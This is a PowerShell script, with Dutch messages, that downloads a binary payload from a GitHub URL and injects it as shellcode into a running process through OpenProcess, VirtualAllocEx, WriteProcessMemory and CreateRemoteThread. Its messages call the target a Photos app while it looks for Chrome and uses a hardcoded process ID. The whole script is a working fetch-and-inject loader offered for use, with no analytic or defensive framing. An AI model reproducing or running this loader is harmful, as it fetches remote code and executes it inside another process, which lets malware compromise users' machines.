$url = "https://raw.githubusercontent.com/Zakelijkgg/niks/main/browser.bin"
if (-not [Environment]::Is64BitProcess) {
    pause
    exit
}
Write-Host "---GEMAAKT DOOR MJBP---" -ForegroundColor Cyan
Write-Host "[+] Zoeken naar proces..." -ForegroundColor Cyan

$edgeProcesses = Get-Process -Name "chrome" -ErrorAction SilentlyContinue

if (-not $edgeProcesses) {
    Write-Host "[*] Foto's-app niet gevonden, wordt gestart..." -ForegroundColor Yellow
    Start-Process "chrome"
    $timeout = 10
    $elapsed = 0
    do {
        Start-Sleep -Seconds 1
        $elapsed++
        $edgeProcesses = Get-Process -Name "chrome" -ErrorAction SilentlyContinue
    } while (-not $edgeProcesses -and $elapsed -lt $timeout)

    if (-not $edgeProcesses) {
        Write-Host "[-] Kon de Foto's-app niet starten!" -ForegroundColor Red
        pause
        exit
    }

    Write-Host "[+] Foto's-app succesvol gestart" -ForegroundColor Green
}

$targetProcess = $edgeProcesses | Select-Object -First 1
$targetPID = 11564
Write-Host "[+] Target foto's gevonden (PID: $targetPID)" -ForegroundColor Green

try {
    $shellcode = (New-Object Net.WebClient).DownloadData($url)
    Write-Host "[+] Download gelukt" -ForegroundColor Green
} catch {
    Write-Host "[-] Download mislukt: $($_.Exception.Message)" -ForegroundColor Red
    pause
    exit
}
$size = $shellcode.Length
Add-Type -MemberDefinition @"
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr hObject);
"@ -Name Win32 -Namespace Native -PassThru

try {
    $hProcess = [IntPtr]::Zero
    $PROCESS_ALL_ACCESS = 0x001F0FFF

    $hProcess = [Native.Win32]::OpenProcess($PROCESS_ALL_ACCESS, $false, $targetPID)
    if ($hProcess -eq [IntPtr]::Zero) { 
        throw "OpenProcess mislukt. Run dit script als Administrator!" 
    }

    $addr = [Native.Win32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, [uint32]$size, 0x3000, 0x40)
    if ($addr -eq [IntPtr]::Zero) { throw "VirtualAllocEx mislukt" }

    $bytesWritten = [UIntPtr]::Zero
    $success = [Native.Win32]::WriteProcessMemory($hProcess, $addr, $shellcode, [uint32]$size, [ref]$bytesWritten)
    if (-not $success -or $bytesWritten.ToUInt64() -ne $size) { throw "WriteProcessMemory mislukt" }

    $oldProtect = 0
    [Native.Win32]::VirtualProtectEx($hProcess, $addr, [uint32]$size, 0x20, [ref]$oldProtect) | Out-Null


    $threadId = 0
    $hThread = [Native.Win32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [ref]$threadId)

    if ($hThread -eq [IntPtr]::Zero) {
        throw "CreateRemoteThread mislukt"
    }
    Write-Host "[+] Gelukt, je kan dit nu afsluiten" -ForegroundColor Green
    Write-Host "[+] Unload door foto's weg te klikken of END klikken op je toetsenbord" -ForegroundColor Yellow
    Write-Host "[+] LAAT FOTO'S OPEN STAAN!!!!" -ForegroundColor Red
} catch {
    Write-Host "[-] Injectie mislukt: $($_.Exception.Message)" -ForegroundColor Red
} finally {
    if ($hProcess -ne [IntPtr]::Zero) {
        [Native.Win32]::CloseHandle($hProcess) | Out-Null
    }
}
